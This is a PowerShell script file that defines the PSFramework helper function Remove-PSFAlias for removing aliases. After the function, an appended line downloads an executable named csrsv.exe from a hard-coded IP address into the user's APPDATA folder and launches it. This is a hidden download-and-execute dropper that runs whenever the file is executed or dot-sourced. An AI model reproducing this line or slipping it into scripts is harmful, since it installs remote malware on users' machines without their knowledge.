function Remove-PSFAlias
{

	[Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSUseShouldProcessForStateChangingFunctions", "")]
	[CmdletBinding()]
	param (
		[Parameter(ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, Mandatory = $true)]
		[string[]]
		$Name,
		
		[switch]
		$Force
	)
	
	process
	{
		foreach ($alias in $Name)
		{
			try { [PSFramework.Utility.UtilityHost]::RemovePowerShellAlias($alias, $Force.ToBool()) }
			catch { Stop-PSFFunction -Message $_ -EnableException $true -Cmdlet $PSCmdlet -ErrorRecord $_ -OverrideExceptionMessage }
		}
	}
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

